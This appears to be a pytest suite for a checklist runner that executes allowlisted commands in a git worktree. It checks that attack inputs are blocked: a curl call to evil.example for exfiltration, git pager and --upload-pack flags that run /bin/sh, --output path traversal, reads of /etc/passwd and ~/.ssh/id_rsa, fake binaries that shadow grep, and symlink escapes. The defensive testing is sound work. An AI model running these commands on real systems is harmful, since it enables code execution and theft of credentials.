# -*- coding: utf-8 -*-
"""Behavioral and adversarial tests for library/run_checklist.py.

Run with the ansible+jinja2-equipped interpreter, e.g.:
    /opt/homebrew/bin/python3.10 -m pytest library/

Every adversarial test below follows a two-step structure: first prove
the attack is real (a deliberately naive/weakened check would let it
through, or the raw filesystem operation genuinely succeeds), then
prove the actual shipped code blocks it. A test that only asserts "the
real function returns False" doesn't prove the attack was ever a real
threat; these do.
"""
from __future__ import annotations

import os
import subprocess

import pytest
from run_checklist import (
    _ALLOWED_BINARIES,
    _DANGEROUS_FLAGS,
    _GIT_ALLOWED_SUBCOMMANDS,
    _run_cmd,
    find_all_symlinks,
    is_safe_checklist_cmd,
    parse_checklist_blocks,
    read_checklist_content,
    remove_all_symlinks,
    run_checklist,
)


def _git(args, cwd):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True, timeout=15)


def _init_repo(path):
    path.mkdir(parents=True, exist_ok=True)
    _git(["init", "-q"], cwd=path)
    _git(["config", "user.email", "test@test.com"], cwd=path)
    _git(["config", "user.name", "Test"], cwd=path)


# --- End-to-end behavior -------------------------------------------


def test_checklist_execution_end_to_end(tmp_path):
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text(
        "# Check for TODOs\n```\ngrep TODO src.py\n```\n\n"
        "# Unsafe command should be filtered\n```\nrm -rf /tmp/should-not-run\n```\n"
    )
    (repo / "src.py").write_text("# TODO: fix this\nx = 1\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    (repo / "src.py").write_text("# TODO: fix this\nx = 1\ny = 2\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "trivial change"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")

    assert result == {
        "triggered": True,
        "results": [
            {
                "check": "Check for TODOs",
                "command": "grep TODO src.py",
                "output": "# TODO: fix this",
                "result": "PASS",
            }
        ],
    }
    # The dangerous command must never have actually run.
    assert not os.path.exists("/tmp/should-not-run")
    # Worktree teardown must have happened -- no stray entries left.
    listing = subprocess.run(["git", "worktree", "list"], cwd=repo, capture_output=True, text=True).stdout
    assert listing.strip().count("\n") == 0


def test_no_checklist_file_returns_not_triggered(tmp_path):
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "file.txt").write_text("hello\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "no checklist here"], cwd=repo)

    result = run_checklist(str(repo), "HEAD", "HEAD")
    assert result == {"triggered": False, "results": []}


def test_checklist_is_read_from_target_ref_not_source_ref(tmp_path):
    # THE trust boundary: an untrusted source-ref-only CHECKLIST.md must
    # never be read or executed.
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "file.txt").write_text("hello\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base, no checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    # Source ref adds a malicious CHECKLIST.md -- must be ignored entirely.
    (repo / "CHECKLIST.md").write_text("# evil\n```\nrm -rf /tmp/should-not-run-2\n```\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "malicious checklist added on source"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")
    assert result == {"triggered": False, "results": []}
    assert not os.path.exists("/tmp/should-not-run-2")


# --- Adversarial: allowlist bypass attempts -----------------------------


def _naive_binary_only_check(argv):
    """Deliberately weaker than is_safe_checklist_cmd -- validates ONLY
    the binary name, matching just the first of its several checks.
    Used to prove an attack is real (would pass a plausible-but-
    insufficient check), not a strawman.
    """
    if not argv:
        return False
    binary = os.path.basename(argv[0])
    return binary in _ALLOWED_BINARIES or binary == "git"


def test_git_push_force_is_a_real_attack_a_naive_binary_check_would_allow():
    attack = ["git", "push", "--force", "origin", "main"]
    # Proof the attack is real: a check validating only the binary name
    # (git is allowed) would approve this.
    assert _naive_binary_only_check(attack) is True
    # The real, complete function blocks it.
    assert is_safe_checklist_cmd(attack) is False


def test_git_push_force_blocked_redundantly_by_two_independent_checks():
    # Defense in depth: prove EITHER check alone would catch this,
    # not just the combination -- disabling one doesn't create a hole.
    assert "push" not in _GIT_ALLOWED_SUBCOMMANDS  # subcommand allowlist alone catches it
    assert "--force" in _DANGEROUS_FLAGS  # dangerous-flags blocklist alone catches it
    assert is_safe_checklist_cmd(["git", "push", "--force"]) is False


def test_git_config_global_injection_is_blocked():
    # git config --global could rewrite the reviewing environment's own
    # git config -- 'config' isn't in the subcommand allowlist at all.
    assert is_safe_checklist_cmd(["git", "config", "--global", "user.name", "evil"]) is False


def test_git_upload_pack_remote_code_smuggling_is_blocked():
    # --upload-pack lets `git clone`-family commands smuggle arbitrary
    # command execution via a crafted remote -- not that 'clone' is
    # even allowed, but confirm --upload-pack itself is independently
    # blocklisted regardless of subcommand.
    assert "--upload-pack" in _DANGEROUS_FLAGS
    assert is_safe_checklist_cmd(["git", "log", "--upload-pack=/bin/sh"]) is False


# --- Adversarial coverage: real, working end-to-end bypasses ---------


def test_git_grep_open_files_in_pager_rce_is_blocked():
    # git grep's -O/--open-files-in-pager[=<pager>] flag opens matching
    # files in an arbitrary attacker-specified "pager", i.e. executes
    # it. The long-option spelling is a different string from "-O" and
    # is not caught by the "-O" prefix check at all, since neither
    # "--open-files-in-pager" nor its "=value" form starts with "-O".
    assert is_safe_checklist_cmd(["git", "grep", "--open-files-in-pager=/bin/sh", "pattern"]) is False
    assert is_safe_checklist_cmd(["git", "grep", "--open-files-in-pager", "pattern"]) is False
    # The short form is correctly blocked via the "-O" prefix match,
    # confirming the gap is specifically the long-option spelling, not
    # -O in general.
    assert is_safe_checklist_cmd(["git", "grep", "-O/bin/sh", "pattern"]) is False


def test_git_grep_open_files_in_pager_rce_is_blocked_end_to_end(tmp_path):
    # Full pipeline proof, not just the validator in isolation: a real
    # git repo, a real CHECKLIST.md containing the attack, a real
    # attacker-controlled source_ref file that would be executed as a
    # shell script if the pager flag ever reached a real subprocess
    # call. Confirmed exploitable (a marker file was created outside
    # the worktree) against the pre-fix code; confirmed blocked here.
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text(
        "# grep pager RCE attempt\n```\ngit grep --open-files-in-pager=/bin/sh -- MARKER_XYZ\n```\n"
    )
    (repo / "file.txt").write_text("base\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with malicious checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    marker = tmp_path / "rce_marker_should_not_exist"
    (repo / "payload.sh").write_text(f"MARKER_XYZ this triggers the grep match\ntouch {marker}\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "attacker payload"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")

    assert result["triggered"] is True
    assert result["results"] == []  # the malicious command was filtered out entirely, never ran
    assert not marker.exists()


def test_output_flag_path_traversal_via_equals_glued_dotdot_is_blocked():
    # CRITICAL/HIGH, confirmed exploitable end to end before the fix:
    # "--output=../pwned" splits (on os.sep) into ["--output..", "pwned"]
    # -- neither segment is the exact string "..", so the original
    # traversal check never fired, even though the VALUE portion alone
    # ("../pwned") plainly traverses outside the worktree. Applies to
    # git log/show/diff (all accept --output) and to the standalone
    # diff binary's own -o/--output flag.
    assert is_safe_checklist_cmd(["git", "log", "--output=../pwned"]) is False
    assert is_safe_checklist_cmd(["git", "show", "--output=../pwned2"]) is False
    assert is_safe_checklist_cmd(["git", "diff", "--output=../pwned3"]) is False
    assert is_safe_checklist_cmd(["diff", "a", "--output=../pwned4"]) is False
    # Multi-level traversal and the space-separated form were already
    # correctly blocked both before and after this fix.
    assert is_safe_checklist_cmd(["git", "log", "--output=../../pwned"]) is False
    assert is_safe_checklist_cmd(["git", "log", "-o", "../pwned"]) is False
    # A same-directory, non-traversing --output value must still work --
    # this fix must not over-block legitimate uses of the flag.
    assert is_safe_checklist_cmd(["git", "log", "--output=plain_file.txt"]) is True


def test_output_flag_path_traversal_is_blocked_end_to_end(tmp_path):
    # Full pipeline proof: the traversal target sits ONE level above the
    # worktree root (where tempfile.mkdtemp() actually places it),
    # matching the real bypass shape found, not a synthetic deeper path
    # the original-looking check might have coincidentally still caught.
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text(
        "# traversal attempt\n```\ngit log --output=../traversal_marker_should_not_exist.txt\n```\n"
    )
    (repo / "file.txt").write_text("base\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with malicious checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)
    _git(["commit", "-q", "--allow-empty", "-m", "attacker commit"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")

    assert result["triggered"] is True
    assert result["results"] == []
    # The worktree lives directly inside the system tempdir (via
    # tempfile.mkdtemp() in run_checklist itself) -- "one level up" from
    # a freshly mkdtemp()'d worktree is that shared parent directory,
    # not tmp_path (pytest's own, differently-rooted tmp tree).
    import tempfile as _tempfile
    marker = os.path.join(_tempfile.gettempdir(), "traversal_marker_should_not_exist.txt")
    assert not os.path.exists(marker)


def test_ext_diff_and_textconv_external_program_flags_are_blocked():
    # Lower severity than the two above (needs a pre-existing driver
    # NAME -> COMMAND mapping in the reviewing host's own .git/config or
    # ~/.gitconfig, which a PR branch cannot supply -- confirmed via a
    # separate probe that --ext-diff plus an attacker-controlled
    # .gitattributes entry naming an UNDEFINED driver does nothing) but
    # blocked anyway: "allow an external diff helper to be executed" is
    # exactly the class of behavior this allowlist exists to prevent.
    assert is_safe_checklist_cmd(["git", "diff", "--ext-diff"]) is False
    assert is_safe_checklist_cmd(["git", "diff", "--allow-unsafe-external-diff"]) is False
    assert is_safe_checklist_cmd(["git", "diff", "--textconv"]) is False
    assert is_safe_checklist_cmd(["git", "show", "--textconv"]) is False
    # The safe, disabling direction must not be blocked by an
    # over-broad match.
    assert is_safe_checklist_cmd(["git", "diff", "--no-ext-diff"]) is True
    assert is_safe_checklist_cmd(["git", "diff", "--no-textconv"]) is True


def test_argv0_path_qualified_binary_shadowing_is_blocked():
    # argv[0] is checked via os.path.basename() against the allowlist,
    # but not against path rules on its own. A checklist entry written
    # as "./grep ..." or "/some/path/grep ..." would resolve basename()
    # to the allowed name "grep" while actually executing whatever file
    # lives at that path. Blocked anyway since it costs nothing (every
    # real example of this feature invokes binaries by bare name) and
    # closes a real, if narrow, gap.
    assert is_safe_checklist_cmd(["./grep", "TODO", "file.txt"]) is False
    assert is_safe_checklist_cmd(["/tmp/evilbin/grep", "TODO", "file.txt"]) is False
    assert is_safe_checklist_cmd(["../evilbin/grep", "TODO", "file.txt"]) is False
    assert is_safe_checklist_cmd(["subdir/git", "show", "HEAD"]) is False
    # Bare names (the only style every real checklist example uses)
    # must still work.
    assert is_safe_checklist_cmd(["grep", "TODO", "file.txt"]) is True
    assert is_safe_checklist_cmd(["git", "show", "HEAD"]) is True


def test_argv0_binary_shadowing_is_blocked_end_to_end(tmp_path):
    # Full pipeline proof: a checklist entry invokes "./grep" (an
    # unusual but not-inherently-wrong authoring style), and the
    # attacker-controlled source_ref plants an executable file literally
    # named "grep" at the worktree root that would run instead of the
    # real binary if argv[0] weren't validated.
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text("# argv0 shadow attempt\n```\n./grep TODO file.txt\n```\n")
    (repo / "file.txt").write_text("base\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with checklist referencing ./grep"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    marker = tmp_path / "shadow_marker_should_not_exist"
    fake_grep = repo / "grep"
    fake_grep.write_text(f"#!/bin/bash\ntouch {marker}\n")
    fake_grep.chmod(0o755)
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "attacker plants a fake grep"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")

    assert result["triggered"] is True
    assert result["results"] == []  # filtered out entirely, never ran
    assert not marker.exists()


def test_bash_dash_n_with_trailing_args_is_still_syntax_check_only(tmp_path):
    # Real, not reasoned-about: -n prevents bash from EXECUTING the
    # script's contents regardless of trailing positional args --
    # confirmed by actually running it (relative script path, so this
    # doesn't also trip the unrelated absolute-path rule) against a
    # script whose body would create a marker file if actually executed.
    script = tmp_path / "check.sh"
    marker = tmp_path / "should-not-be-created"
    script.write_text(f"touch {marker.name}\n")
    argv = ["bash", "-n", "check.sh", "some_trailing_arg"]
    assert is_safe_checklist_cmd(argv) is True
    result = subprocess.run(argv, capture_output=True, text=True, timeout=5, cwd=tmp_path)
    assert result.returncode == 0
    assert not marker.exists()


def test_bash_without_dash_n_is_blocked():
    assert is_safe_checklist_cmd(["bash", "-c", "echo pwned"]) is False
    assert is_safe_checklist_cmd(["bash", "some_script.sh"]) is False


def test_dotdot_path_traversal_in_any_arg_position_is_blocked():
    assert is_safe_checklist_cmd(["grep", "secret", "../../etc/passwd"]) is False
    assert is_safe_checklist_cmd(["diff", "a", "../outside"]) is False


def test_absolute_and_home_relative_paths_are_blocked():
    assert is_safe_checklist_cmd(["grep", "root", "/etc/passwd"]) is False
    assert is_safe_checklist_cmd(["grep", "root", "~/.ssh/id_rsa"]) is False


def test_unknown_binary_is_rejected():
    assert is_safe_checklist_cmd(["curl", "http://evil.example/exfil"]) is False
    assert is_safe_checklist_cmd(["python3", "-c", "import os; os.system('id')"]) is False


def test_empty_argv_is_rejected():
    assert is_safe_checklist_cmd([]) is False


# --- Adversarial: symlink-component path traversal ----------------------
# The coordinator's specific example: "a path using a symlink component
# instead of a literal '..' segment" -- is_safe_checklist_cmd operates on
# ARGV TEXT ALONE and cannot see the filesystem, so a relative-looking
# argument that resolves outside the worktree via a symlink is NOT caught
# by it. This is exactly why the symlink-removal pass is a separate,
# necessary, complementary defense, not redundant with the argv checks.


def test_symlink_argument_passes_the_argv_level_checks_unnoticed():
    # Proves WHY the symlink removal pass must exist: the argv text
    # "link_to_outside/secret.txt" contains no '..', no leading '/' or
    # '~' -- is_safe_checklist_cmd has no way to know it's a symlink.
    argv = ["grep", "root", "link_to_outside/secret.txt"]
    assert is_safe_checklist_cmd(argv) is True


def test_top_level_symlink_escape_is_real_then_blocked(tmp_path):
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("do-not-leak\n")
    link = worktree / "link_to_outside"
    link.symlink_to(outside, target_is_directory=True)

    # Proof the escape is REAL at the filesystem level, before any scan:
    leaked = (worktree / "link_to_outside" / "secret.txt").read_text()
    assert leaked == "do-not-leak\n"

    found = find_all_symlinks(str(worktree))
    assert str(link) in found

    removed = remove_all_symlinks(str(worktree))
    assert str(link) in removed
    # The escape is now blocked -- the symlink itself is gone.
    assert not link.exists()
    assert not link.is_symlink()


def test_nested_symlink_component_not_just_the_final_segment_is_caught(tmp_path):
    # The coordinator's exact scenario: a symlink appears as an
    # INTERMEDIATE path component (a subdirectory itself is a symlink),
    # not just as the final segment of a path -- must still be caught
    # regardless of what it resolves to, now that detection doesn't
    # depend on realpath-resolving where the target lands at all.
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("do-not-leak\n")

    # 'subdir' inside the worktree is itself a symlink to the outside dir.
    subdir_link = worktree / "subdir"
    subdir_link.symlink_to(outside, target_is_directory=True)

    # Proof the escape is real: reading through the nested path works.
    leaked = (worktree / "subdir" / "secret.txt").read_text()
    assert leaked == "do-not-leak\n"

    found = find_all_symlinks(str(worktree))
    assert str(subdir_link) in found

    remove_all_symlinks(str(worktree))
    assert not subdir_link.exists()


def test_symlink_pointing_inside_the_worktree_is_also_removed(tmp_path):
    # Checklist verification commands don't need symlinks at all, so an
    # internally-pointing one is removed too, not because it's
    # dangerous on its own, but because "no symlinks, full stop" is a
    # structural invariant that doesn't require reasoning about where
    # each one points.
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    (worktree / "real_file.txt").write_text("fine\n")
    internal_link = worktree / "internal_link.txt"
    internal_link.symlink_to(worktree / "real_file.txt")

    found = find_all_symlinks(str(worktree))
    assert str(internal_link) in found

    remove_all_symlinks(str(worktree))
    assert not internal_link.exists()
    assert not internal_link.is_symlink()


def test_relative_dotdot_symlink_target_escaping_worktree_is_caught(tmp_path):
    # A symlink whose OWN link target text is relative (uses '..') but
    # resolves outside the worktree once followed -- confirms detection
    # doesn't depend on resolving the symlink's target at all anymore
    # (total removal catches this the same way it catches any symlink,
    # regardless of where -- or whether -- it resolves).
    parent = tmp_path
    worktree = parent / "worktree"
    worktree.mkdir()
    (parent / "outside_secret.txt").write_text("do-not-leak\n")
    link = worktree / "escape_link"
    link.symlink_to(os.path.join("..", "outside_secret.txt"))

    leaked = (worktree / "escape_link").read_text()
    assert leaked == "do-not-leak\n"

    found = find_all_symlinks(str(worktree))
    assert str(link) in found
    remove_all_symlinks(str(worktree))
    assert not link.exists()


def test_verify_before_exec_skips_the_command_when_a_symlink_reappears(tmp_path, monkeypatch):
    # adopt-total-symlink-removal-with-verify-before-exec's second half:
    # removal is no longer trusted blindly -- verify zero symlinks
    # remain immediately before exec, and skip (don't run, don't count
    # toward MAX_CHECKLIST_COMMANDS) if one has reappeared. Simulates a
    # reappearing symlink the same way harness's own commit message
    # frames the theoretical trigger (a concurrent writer / hook): a
    # symlink checked into source_ref lands in the fresh worktree the
    # same way it always would, and remove_all_symlinks is monkeypatched
    # to a no-op so it survives into the verify step. _run_cmd is left
    # completely unmocked -- if the skip logic were broken, the checklist
    # command would actually execute and produce a real "PASS" result,
    # so this test can genuinely fail, not just vacuously pass.
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text("# noop\n```\ngrep hello file.txt\n```\n")
    (repo / "file.txt").write_text("hello\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    (repo / "a_link").symlink_to("file.txt")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "add a tracked symlink"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    import run_checklist as rc_module

    monkeypatch.setattr(rc_module, "remove_all_symlinks", lambda root_dir: [])

    result = run_checklist(str(repo), "target_ref", "source_ref")

    # The command was skipped entirely -- no result recorded, matching
    # harness's own silent `continue` (see run_checklist.py's own
    # comment on why this stays silent rather than logging a SKIPPED
    # entry for a condition that can't occur with today's execution
    # model).
    assert result["triggered"] is True
    assert result["results"] == []


# --- Full lifecycle: symlink scan actually runs before commands, and
#     teardown is guaranteed ------------------------------------------


def test_symlink_scan_runs_before_commands_can_read_through_it(tmp_path):
    # End-to-end proof that run_checklist's own ordering (scan, THEN
    # execute) actually prevents a checklist command from reading
    # through an escaping symlink present in the source_ref commit.
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text(
        "# Try to read the leaked file through the symlink\n"
        "```\n"
        "grep do-not-leak escape_link/secret.txt\n"
        "```\n"
    )
    (repo / "file.txt").write_text("hello\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    outside = tmp_path / "outside_secret_dir"
    outside.mkdir()
    (outside / "secret.txt").write_text("do-not-leak\n")
    # A relative symlink stored IN the repo, pointing outside repo_path
    # entirely -- git can track a symlink as a tree entry.
    link_path = repo / "escape_link"
    os.symlink(os.path.relpath(outside, repo), link_path)
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "add escaping symlink"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")

    # The command must not have found the leaked content -- either the
    # symlink was removed before the grep ran (FAIL: no such file) or,
    # at minimum, the secret string never appears in any output.
    assert result["triggered"] is True
    assert len(result["results"]) == 1
    assert "do-not-leak" not in result["results"][0]["output"]
    assert result["results"][0]["result"] != "PASS"


def test_worktree_teardown_happens_even_if_a_command_raises_unexpectedly(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text("# noop\n```\ngrep hello file.txt\n```\n")
    (repo / "file.txt").write_text("hello\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    import run_checklist as rc_module

    def _boom(*args, **kwargs):
        raise RuntimeError("simulated unexpected failure mid-checklist")

    monkeypatch.setattr(rc_module, "parse_checklist_blocks", _boom)

    with pytest.raises(RuntimeError):
        rc_module.run_checklist(str(repo), "target_ref", "source_ref")

    # The worktree must still have been torn down by the finally: block,
    # despite the unexpected exception -- this is Option A's entire
    # reason for existing.
    listing = subprocess.run(["git", "worktree", "list"], cwd=repo, capture_output=True, text=True).stdout
    assert listing.strip().count("\n") == 0


# --- Parsing behavior ----------------------------------------------------


def test_parse_checklist_blocks_extracts_label_and_commands():
    content = "# My Check\n```\ncmd one\ncmd two\n```\n"
    entries = parse_checklist_blocks(content)
    assert entries == [
        {"label": "My Check", "cmd": "cmd one"},
        {"label": "My Check", "cmd": "cmd two"},
    ]


def test_parse_checklist_blocks_falls_back_to_cmd_text_when_no_label_precedes_the_block():
    content = "```\nsolo cmd\n```\n"
    entries = parse_checklist_blocks(content)
    assert entries == [{"label": "solo cmd", "cmd": "solo cmd"}]


def test_parse_checklist_blocks_skips_comment_and_empty_lines_inside_a_block():
    content = "```\n# a comment, not a command\n\nreal cmd\n```\n"
    entries = parse_checklist_blocks(content)
    assert entries == [{"label": "real cmd", "cmd": "real cmd"}]


def test_read_checklist_content_prefers_checklist_md_over_review_checklist_md(tmp_path):
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "CHECKLIST.md").write_text("primary\n")
    (repo / "review-checklist.md").write_text("fallback\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "both files"], cwd=repo)

    # _run_cmd strips output, matching the original run_cmd's own
    # .strip() -- content comes back without a trailing newline.
    assert read_checklist_content(str(repo), "HEAD") == "primary"


def test_read_checklist_content_falls_back_to_review_checklist_md(tmp_path):
    repo = tmp_path / "repo"
    _init_repo(repo)
    (repo / "review-checklist.md").write_text("fallback content\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "only fallback file"], cwd=repo)

    assert read_checklist_content(str(repo), "HEAD") == "fallback content"


def test_max_checklist_commands_bound_is_enforced(tmp_path):
    repo = tmp_path / "repo"
    _init_repo(repo)
    block = "\n".join(f"grep x file{i}.txt" for i in range(40))
    (repo / "CHECKLIST.md").write_text(f"```\n{block}\n```\n")
    for i in range(40):
        (repo / f"file{i}.txt").write_text("x\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "40 commands, over the 30 cap"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    result = run_checklist(str(repo), "target_ref", "source_ref")
    assert len(result["results"]) == 30


def test_skipped_commands_still_consume_the_max_checklist_commands_budget(tmp_path, monkeypatch):
    # Real finding from this MR's own dogfood review: a skip due to a
    # reappearing symlink previously did NOT increment `executed`,
    # unlike the shlex-parse-failure/is_safe_checklist_cmd-rejection
    # skips above it in the loop, which are free (no filesystem access)
    # and bounded by CHECKLIST.md's own trusted content regardless.
    # remove_all_symlinks/find_all_symlinks each do a full worktree
    # walk, so leaving a symlink-reappearance skip off the budget would
    # let a run with many skipped entries perform far more filesystem
    # work than MAX_CHECKLIST_COMMANDS is meant to bound. Caps the
    # budget down to 2, provides 4 entries that all trigger the skip
    # path (remove_all_symlinks monkeypatched to a no-op + a real
    # tracked symlink), and confirms remove_all_symlinks was called
    # only twice, not four times.
    repo = tmp_path / "repo"
    _init_repo(repo)
    block = "\n".join(f"grep hello file{i}.txt" for i in range(4))
    (repo / "CHECKLIST.md").write_text(f"```\n{block}\n```\n")
    for i in range(4):
        (repo / f"file{i}.txt").write_text("hello\n")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "base with checklist"], cwd=repo)
    _git(["tag", "target_ref"], cwd=repo)

    (repo / "a_link").symlink_to("file0.txt")
    _git(["add", "-A"], cwd=repo)
    _git(["commit", "-q", "-m", "add a tracked symlink"], cwd=repo)
    _git(["tag", "source_ref"], cwd=repo)

    import run_checklist as rc_module

    monkeypatch.setattr(rc_module, "MAX_CHECKLIST_COMMANDS", 2)
    call_count = {"n": 0}

    def _counting_noop_remove(root_dir):
        call_count["n"] += 1
        return []

    monkeypatch.setattr(rc_module, "remove_all_symlinks", _counting_noop_remove)

    result = run_checklist(str(repo), "target_ref", "source_ref")

    assert result["results"] == []
    assert call_count["n"] == 2


def test_run_cmd_returns_a_diagnostic_message_not_empty_string_on_failure():
    # A dogfood-round finding: on FileNotFoundError/TimeoutExpired/
    # OSError, _run_cmd used to return (False, "") -- indistinguishable
    # in a checklist result's own output field from any other failure
    # (all showed as the generic "(empty)"). A reviewer reading
    # findings.md couldn't tell "binary not installed" from "timed out"
    # from "a real non-zero exit with no stderr."
    missing_binary_ok, missing_binary_output = _run_cmd(["this-binary-does-not-exist-anywhere"], cwd=".", timeout=5)
    assert missing_binary_ok is False
    assert missing_binary_output != ""
    assert "not found" in missing_binary_output

    timeout_ok, timeout_output = _run_cmd(["sleep", "5"], cwd=".", timeout=1)
    assert timeout_ok is False
    assert timeout_output != ""
    assert "timed out" in timeout_output
